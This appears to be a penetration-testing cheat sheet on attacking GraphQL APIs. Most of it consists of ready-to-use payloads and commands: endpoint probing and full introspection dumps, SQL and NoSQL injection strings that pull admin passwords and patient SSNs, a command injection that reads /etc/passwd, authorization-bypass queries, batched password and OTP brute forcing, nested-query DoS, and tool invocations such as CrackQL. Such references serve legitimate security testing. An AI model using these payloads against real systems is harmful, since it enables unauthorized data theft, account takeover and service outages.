# GraphQL Injection

## Description
GraphQL is a query language for APIs that provides a complete description of the data. GraphQL vulnerabilities include introspection-based information disclosure, injection attacks (SQL, NoSQL), authentication/authorization bypasses, batching attacks, and denial of service through complex queries.

## GraphQL Endpoints

### Common Endpoints
```
/graphql
/graphiql
/graphql/console
/graphql.php
/graphql/graphql
/api/graphql
/api/graphiql
/v1/graphql
/v1/graphiql
/graph
/query
```

### Endpoint Detection
```bash
# Probe for GraphQL endpoint
curl -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query": "{ __typename }"}'

# Check for introspection
curl -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query": "{ __schema { types { name } } }"}'
```

## Introspection Queries

### Basic Schema Dump
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### Full Introspection Query
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

### Query Type Fields
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type { name }
        }
      }
    }
  }
}
```

## Injection Attacks

### SQL Injection via GraphQL
```graphql
# In search/filter parameters
{
  users(search: "' OR '1'='1") {
    id
    username
    email
  }
}

# With UNION
{
  users(search: "' UNION SELECT 1,username,password FROM admin--") {
    id
    username
    email
  }
}
```

### NoSQL Injection via GraphQL
```graphql
# MongoDB injection
{
  doctors(
    options: "{\"patients.ssn\": 1}",
    search: "{ \"patients.ssn\": { \"$regex\": \".*\" }, \"lastName\": \"Admin\" }"
  ) {
    firstName
    lastName
    patients {
      ssn
    }
  }
}

# $where injection
{
  users(filter: "{ \"$where\": \"this.password.length > 0\" }") {
    username
  }
}
```

### OS Command Injection
```graphql
{
  systemInfo(command: "id; cat /etc/passwd") {
    output
  }
}
```

## Authorization Bypass

### Field-Level Authorization
```graphql
# Try accessing admin-only fields
{
  user(id: 1) {
    id
    username
    email
    # Try admin fields
    passwordHash
    apiKey
    role
    isAdmin
  }
}
```

### Query vs Mutation Authorization
```graphql
# Query might be protected, but mutation isn't
mutation {
  updateUser(id: 2, role: "admin") {
    id
    role
  }
}
```

### Alias-Based Bypass
```graphql
# Use aliases to access same field multiple times
{
  user1: user(id: 1) { secret }
  user2: user(id: 2) { secret }
  user3: user(id: 3) { secret }
}
```

## Batching Attacks

### Query Batching
```graphql
# Send multiple queries in one request
[
  { "query": "{ user(id: 1) { password } }" },
  { "query": "{ user(id: 2) { password } }" },
  { "query": "{ user(id: 3) { password } }" }
]
```

### Brute Force via Batching
```graphql
# Password brute force
mutation {
  login1: login(user: "admin", pass: "password1") { token }
  login2: login(user: "admin", pass: "password2") { token }
  login3: login(user: "admin", pass: "password3") { token }
  # ... continue
}
```

### OTP Bypass
```graphql
mutation {
  otp0000: verifyOTP(code: "0000") { success }
  otp0001: verifyOTP(code: "0001") { success }
  otp0002: verifyOTP(code: "0002") { success }
  # ... 10000 attempts in one request
}
```

## DoS Attacks

### Deeply Nested Query
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

### Field Duplication
```graphql
{
  user(id: 1) {
    name
    name
    name
    # Repeat many times
  }
}
```

### Circular Fragments
```graphql
fragment A on User {
  friends { ...B }
}
fragment B on User {
  friends { ...A }
}
query {
  user(id: 1) { ...A }
}
```

## Information Disclosure

### Error-Based Enumeration
```graphql
# Trigger errors to reveal schema
{
  user(id: "invalid") {
    nonexistentField
  }
}
```

### Suggestions Exploitation
```graphql
# GraphQL may suggest similar field names
{
  user {
    passwor  # Might suggest 'password'
  }
}
```

## Tools

### GraphQLmap
```bash
# https://github.com/swisskyrepo/GraphQLmap

# Interactive mode
python graphqlmap.py -u "https://target.com/graphql"

# Dump schema
python graphqlmap.py -u "https://target.com/graphql" --dump

# SQL injection
python graphqlmap.py -u "https://target.com/graphql" --sql
```

### InQL (Burp Extension)
```
1. Install from BApp Store
2. Send GraphQL request to InQL
3. Analyze schema
4. Generate queries automatically
```

### GraphQL Cop
```bash
# https://github.com/dolevf/graphql-cop

# Security audit
python graphql-cop.py -t https://target.com/graphql
```

### CrackQL
```bash
# https://github.com/nicholasaleks/CrackQL

# Brute force attack
python crackql.py -t https://target.com/graphql \
    -q "mutation { login(email: \"EMAIL\", password: \"PASSWORD\") { token } }" \
    -i credentials.csv
```

### Clairvoyance
```bash
# https://github.com/nicholasaleks/clairvoyance
# Schema recovery when introspection is disabled

python clairvoyance.py -o recovered_schema.json https://target.com/graphql
```

## Testing Checklist

- [ ] Identify GraphQL endpoint
- [ ] Test for introspection
- [ ] Dump full schema
- [ ] Identify queries and mutations
- [ ] Test for SQL/NoSQL injection
- [ ] Test authorization on each field
- [ ] Test batching for brute force
- [ ] Test for DoS via nested queries
- [ ] Check for information disclosure in errors
- [ ] Test IDOR via ID manipulation

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
- https://portswigger.net/web-security/graphql
- https://graphql.org/learn/introspection/
